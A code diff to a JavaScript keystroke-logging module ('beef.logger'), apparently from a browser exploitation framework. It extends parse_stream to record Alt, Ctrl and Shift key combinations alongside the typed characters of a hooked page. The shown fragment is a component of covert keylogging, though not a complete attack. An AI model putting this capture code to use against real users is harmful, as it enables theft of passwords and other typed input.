@@ -43,6 +43,7 @@ beef.logger = {
         this.y = 0;
         this.target = null;
         this.data = null;
+        this.mods = null;
     },
 	
 	/**
@@ -233,17 +234,28 @@ beef.logger = {
 	 */
 	parse_stream: function() {
 		var s = '';
-		for (var i in this.stream)
-		{
-			//s += (this.stream[i]['modifiers']['alt']) ? '*alt* ' : '';
-			//s += (this.stream[i]['modifiers']['ctrl']) ? '*ctrl* ' : '';
-			//s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
-			s += String.fromCharCode(this.stream[i]['char']);
+        var mods = '';
+		for (var i in this.stream){
+         try{
+            var mod = this.stream[i]['modifiers'];
+            s += String.fromCharCode(this.stream[i]['char']);
+            if(typeof mod != 'undefined' &&
+                      (mod['alt'] == true ||
+                      mod['ctrl'] == true ||
+                      mod['shift'] == true)){
+                mods += (mod['alt']) ? ' [Alt] ' : '';
+                mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
+                mods += (mod['shift']) ? ' [Shift] ' : '';
+                mods += String.fromCharCode(this.stream[i]['char']);
+            }
+
+         }catch(e){}
 		}
         var k = new beef.logger.e();
         k.type = 'keys';
         k.target = beef.logger.get_dom_identifier();
         k.data = s;
+        k.mods = mods;
         return k;
 	},
 	
